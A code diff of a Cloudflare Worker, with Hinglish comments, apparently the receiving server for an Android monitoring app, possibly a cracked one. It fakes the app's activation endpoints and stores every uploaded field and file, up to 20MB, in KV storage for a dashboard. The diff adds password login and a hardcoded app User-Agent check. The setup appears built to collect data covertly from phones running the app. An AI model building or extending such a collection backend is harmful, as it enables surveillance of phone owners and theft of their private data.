@@ -1,14 +1,19 @@
-// Guardian Panel — API Worker (UI is served from public/index.html via [assets])
-// APK ke liye zaroori responses:
-//   - Data upload endpoints  -> EXACT text "ok"  (Retrofit String check: body.equals("ok"))
-//   - user/loginUser.php     -> {"status":"ok","idClient":1}
-//   - user/verifPhone.php    -> {"status":"ok","nbPhone":0}
-//   - user/savePhone.php     -> {"status":"ok","idPhone":1}   (isi se app activate hoti hai)
-//   - user/getLastVersionApp.php -> {"forceUpdateApp":"false"}
-// Har POST capture hoke /api/captures mein dikhta hai.
+// Guardian Panel — API Worker with LOGIN SYSTEM
+// UI: public/index.html (auth ke baad), public/login.html (login page)
+// APK ke liye: POST endpoints khule hain lekin sirf asli APK ka User-Agent accept hota hai.
+//   Data uploads      -> EXACT text "ok"
+//   user/loginUser.php        -> {"status":"ok","idClient":1}
+//   user/verifPhone.php       -> {"status":"ok","nbPhone":0}
+//   user/savePhone.php        -> {"status":"ok","idPhone":1}
+//   user/getLastVersionApp.php-> {"forceUpdateApp":"false"}
+// Password repo mein NAHI hai — sirf SHA-256 hash hai (repo public hai).
+// Naya password chahiye to naya hash banao aur PASS_HASH badlo.
 
 var captures = [];
 var MAX_CAPTURES = 2000;
+var PASS_HASH = "86f1672bb6586732adac9bc70e357457bfe50c1dd20cdcbcf82476f6a0d0a3d5";
+var SESSION_DAYS = 30;
+var APK_UA = "ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019";
 
 addEventListener("fetch", function (event) {
   event.respondWith(handle(event.request));
@@ -29,7 +34,107 @@ function jsonResp(obj, status) {
   });
 }
 
-function handle(request) {
+/* ---------- auth helpers ---------- */
+function b64url(u8) {
+  var s = "";
+  for (var i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
+  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+}
+
+async function sha256Hex(text) {
+  var buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
+  var u8 = new Uint8Array(buf);
+  var out = "";
+  for (var i = 0; i < u8.length; i++) out += (u8[i] < 16 ? "0" : "") + u8[i].toString(16);
+  return out;
+}
+
+async function signSession(expStr) {
+  var key = await crypto.subtle.importKey(
+    "raw",
+    new TextEncoder().encode(PASS_HASH),
+    { name: "HMAC", hash: "SHA-256" },
+    false,
+    ["sign"]
+  );
+  var sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(expStr));
+  return b64url(new Uint8Array(sig));
+}
+
+async function makeSessionToken() {
+  var exp = String(Date.now() + SESSION_DAYS * 24 * 3600 * 1000);
+  var sig = await signSession(exp);
+  return exp + "." + sig;
+}
+
+async function hasValidSession(request) {
+  try {
+    var ck = request.headers.get("Cookie") || "";
+    var m = ck.match(/(?:^|;\s*)gp_session=([^;]+)/);
+    if (!m) return false;
+    var parts = m[1].split(".");
+    if (parts.length !== 2) return false;
+    var exp = parseInt(parts[0], 10);
+    if (!exp || exp < Date.now()) return false;
+    var sig = await signSession(parts[0]);
+    return sig === parts[1];
+  } catch (e) {
+    return false;
+  }
+}
+
+/* ---------- assets ---------- */
+async function serveAsset(origin, targetPath) {
+  if (typeof ASSETS === "undefined" || !ASSETS) {
+    return new Response("Dashboard files not configured (assets missing)", { status: 500 });
+  }
+  try {
+    return await ASSETS.fetch(new Request(origin + targetPath));
+  } catch (e) {
+    return new Response("Asset error: " + String(e), { status: 500 });
+  }
+}
+
+/* ---------- file serving (KV) ---------- */
+async function serveFile(key) {
+  if (typeof KV_DATA === "undefined" || !KV_DATA) {
+    return jsonResp({ error: "KV_DATA not connected" }, 404);
+  }
+  if (!key || key.indexOf(":") >= 0) {
+    return jsonResp({ error: "bad key" }, 400);
+  }
+  try {
+    var metaRaw = await KV_DATA.get("m:" + key);
+    var data = await KV_DATA.get("f:" + key, "arrayBuffer");
+    if (!data) {
+      return jsonResp({ error: "not found" }, 404);
+    }
+    var meta = { type: "application/octet-stream", name: key };
+    if (metaRaw) {
+      try {
+        meta = JSON.parse(metaRaw);
+      } catch (e) {
+        // keep default meta
+      }
+    }
+    return new Response(data, {
+      status: 200,
+      headers: Object.assign(
+        {
+          "content-type": meta.type || "application/octet-stream",
+          "content-disposition": 'inline; filename="' + String(meta.name || key) + '"',
+          "cache-control": "public, max-age=86400",
+        },
+        corsHeaders()
+      ),
+    });
+  } catch (e2) {
+    return jsonResp({ error: String(e2) }, 500);
+  }
+}
+
+/* ---------- main router ---------- */
+async function handle(request) {
   var url = new URL(request.url);
   var method = request.method;
   var path = url.pathname;
@@ -38,43 +143,81 @@ function handle(request) {
     return new Response(null, { status: 204, headers: corsHeaders() });
   }
 
-  // ---------- Dashboard API ----------
-  if (path === "/api/captures" && method === "GET") {
-    return jsonResp(captures);
-  }
-  if (path === "/api/clear" && method === "POST") {
-    captures = [];
-    return jsonResp({ ok: true, message: "cleared" });
-  }
-  if (path === "/api/health" && method === "GET") {
-    return jsonResp({ ok: true, captures: captures.length, time: new Date().toISOString() });
-  }
-  if (path.indexOf("/api/file/") === 0 && method === "GET") {
-    return serveFile(path.slice("/api/file/".length));
+  // ---------- LOGIN (no auth needed) ----------
+  if (path === "/api/login" && method === "POST") {
+    try {
+      var loginBody = await request.json();
+      var inputHash = await sha256Hex(String(loginBody.password || ""));
+      if (inputHash === PASS_HASH) {
+        var tok = await makeSessionToken();
+        return new Response(JSON.stringify({ ok: true }), {
+          status: 200,
+          headers: Object.assign(
+            {
+              "content-type": "application/json; charset=utf-8",
+              "Set-Cookie":
+                "gp_session=" + tok + "; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=" + (SESSION_DAYS * 24 * 3600),
+            },
+            corsHeaders()
+          ),
+        });
+      }
+      return jsonResp({ ok: false, error: "wrong password" }, 401);
+    } catch (e) {
+      return jsonResp({ ok: false, error: "bad request" }, 400);
+    }
   }
 
-  // ---------- APK capture (any POST) ----------
+  // ---------- LOGOUT (clears cookie) ----------
+  if (path === "/api/logout" && method === "POST") {
+    return new Response(JSON.stringify({ ok: true }), {
+      status: 200,
+      headers: Object.assign(
+        {
+          "content-type": "application/json; charset=utf-8",
+          "Set-Cookie": "gp_session=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0",
+        },
+        corsHeaders()
+      ),
+    });
+  }
+
+  // ---------- Dashboard API (auth required) ----------
+  if (path.indexOf("/api/") === 0) {
+    var authed = await hasValidSession(request);
+    if (!authed) {
+      return jsonResp({ error: "unauthorized" }, 401);
+    }
+    if (path === "/api/captures" && method === "GET") return jsonResp(captures);
+    if (path === "/api/clear" && method === "POST") {
+      captures = [];
+      return jsonResp({ ok: true, message: "cleared" });
+    }
+    if (path === "/api/health" && method === "GET") {
+      return jsonResp({ ok: true, captures: captures.length, time: new Date().toISOString() });
+    }
+    if (path.indexOf("/api/file/") === 0 && method === "GET") {
+      return serveFile(path.slice("/api/file/".length));
+    }
+    return jsonResp({ error: "not found" }, 404);
+  }
+
+  // ---------- APK capture (POST, khule hain lekin sirf asli APK UA) ----------
   if (method === "POST") {
-    var p = url.pathname;
+    var ua = request.headers.get("user-agent") || "";
+    if (ua.indexOf(APK_UA) < 0) {
+      // Random spam bots yahan ruk jayenge — sirf APK ke requests capture hote hain
+      return jsonResp({ error: "forbidden" }, 403);
+    }
 
-    // Capture pehle — response baad mein (capture fail ho to bhi APK ko jawab mile)
+    var p = url.pathname;
     var capPromise = capturePost(request, url);
 
     return capPromise.then(function () {
-      // Activation / config endpoints (JSON)
-      if (p === "/user/loginUser.php") {
-        return jsonResp({ status: "ok", idClient: 1 });
-      }
-      if (p === "/user/verifPhone.php") {
-        return jsonResp({ status: "ok", nbPhone: 0 });
-      }
-      if (p === "/user/savePhone.php") {
-        return jsonResp({ status: "ok", idPhone: 1 });
-      }
-      if (p === "/user/getLastVersionApp.php") {
-        return jsonResp({ forceUpdateApp: "false", lastVersion: "525" });
-      }
-      // Baaki SAB endpoints: plain text "ok" — app isi ko success maanta hai
+      if (p === "/user/loginUser.php") return jsonResp({ status: "ok", idClient: 1 });
+      if (p === "/user/verifPhone.php") return jsonResp({ status: "ok", nbPhone: 0 });
+      if (p === "/user/savePhone.php") return jsonResp({ status: "ok", idPhone: 1 });
+      if (p === "/user/getLastVersionApp.php") return jsonResp({ forceUpdateApp: "false", lastVersion: "525" });
       return new Response("ok", {
         status: 200,
         headers: Object.assign({ "content-type": "text/plain; charset=utf-8" }, corsHeaders()),
@@ -82,14 +225,27 @@ function handle(request) {
     });
   }
 
-  // Unknown GET -> dashboard
+  // ---------- GET routing (auth ke saath) ----------
   if (method === "GET") {
-    return Response.redirect(url.origin + "/", 302);
+    var authedGet = await hasValidSession(request);
+
+    if (authedGet) {
+      if (path === "/" || path === "/index.html") return serveAsset(url.origin, "/index.html");
+      if (path === "/login") return Response.redirect(url.origin + "/", 302);
+      return Response.redirect(url.origin + "/", 302);
+    }
+
+    // Not logged in
+    if (path === "/login" || path === "/login.html") {
+      return serveAsset(url.origin, "/login.html");
+    }
+    return Response.redirect(url.origin + "/login", 302);
   }
 
   return new Response("Not found", { status: 404, headers: corsHeaders() });
 }
 
+/* ---------- capture ---------- */
 async function capturePost(request, url) {
   var fields = {};
   var files = [];
@@ -115,7 +271,6 @@ async function capturePost(request, url) {
             size: value.size,
             fileKey: null,
           };
-          // KV bound ho aur file 20MB se choti ho to store karo
           if (typeof KV_DATA !== "undefined" && KV_DATA && value.size <= 20971520) {
             try {
               var fkey = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
@@ -165,41 +320,4 @@ async function capturePost(request, url) {
     captures.pop();
   }
   return cap;
-}
-
-async function serveFile(key) {
-  if (typeof KV_DATA === "undefined" || !KV_DATA) {
-    return jsonResp({ error: "KV_DATA not connected" }, 404);
-  }
-  if (!key || key.indexOf(":") >= 0) {
-    return jsonResp({ error: "bad key" }, 400);
-  }
-  try {
-    var metaRaw = await KV_DATA.get("m:" + key);
-    var data = await KV_DATA.get("f:" + key, "arrayBuffer");
-    if (!data) {
-      return jsonResp({ error: "not found" }, 404);
-    }
-    var meta = { type: "application/octet-stream", name: key };
-    if (metaRaw) {
-      try {
-        meta = JSON.parse(metaRaw);
-      } catch (e) {
-        // keep default meta
-      }
-    }
-    return new Response(data, {
-      status: 200,
-      headers: Object.assign(
-        {
-          "content-type": meta.type || "application/octet-stream",
-          "content-disposition": 'inline; filename="' + String(meta.name || key) + '"',
-          "cache-control": "public, max-age=86400",
-        },
-        corsHeaders()
-      ),
-    });
-  } catch (e2) {
-    return jsonResp({ error: String(e2) }, 500);
-  }
 }
